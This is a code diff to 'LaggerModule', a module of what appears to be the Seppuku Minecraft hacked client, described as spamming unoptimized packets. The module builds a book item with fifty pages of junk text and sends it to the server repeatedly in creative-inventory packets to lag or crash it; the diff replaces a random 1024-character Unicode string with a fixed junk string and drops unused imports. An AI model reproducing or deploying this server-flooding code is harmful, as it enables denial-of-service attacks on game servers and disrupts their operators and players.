@@ -8,7 +8,6 @@ import me.rigamortis.seppuku.api.value.OptionalValue;
 import net.minecraft.client.Minecraft;
 import net.minecraft.entity.Entity;
 import net.minecraft.init.Items;
-import net.minecraft.inventory.ClickType;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
@@ -20,10 +19,6 @@ import net.minecraft.util.EnumHand;
 import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.text.TextComponentString;
 import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;
-
-import java.util.Random;
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
 
 /**
  * Author Seth
@@ -37,12 +32,8 @@ public final class LaggerModule extends Module {
 
     final Minecraft mc = Minecraft.getMinecraft();
 
-    private String rand;
-
     public LaggerModule() {
         super("Lagger", new String[]{"Lag"}, "Spams unoptimized packets", "NONE", -1, ModuleType.MISC);
-        final IntStream gen = new Random().ints(0x80, 0x10ffff - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
-        this.rand = gen.limit(1024).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
     }
 
     @Override
@@ -91,7 +82,7 @@ public final class LaggerModule extends Module {
                     final NBTTagList pages = new NBTTagList();
 
                     for (int page = 0; page < 50; page++) {
-                        pages.appendTag(new NBTTagString(this.rand));
+                        pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                     }
 
                     final NBTTagCompound tag = new NBTTagCompound();
@@ -102,7 +93,7 @@ public final class LaggerModule extends Module {
 
                     for (int i = 0; i <= this.packets.getInt(); i++) {
                         mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
-                        // mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
+                        //mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                     }
                     break;
             }
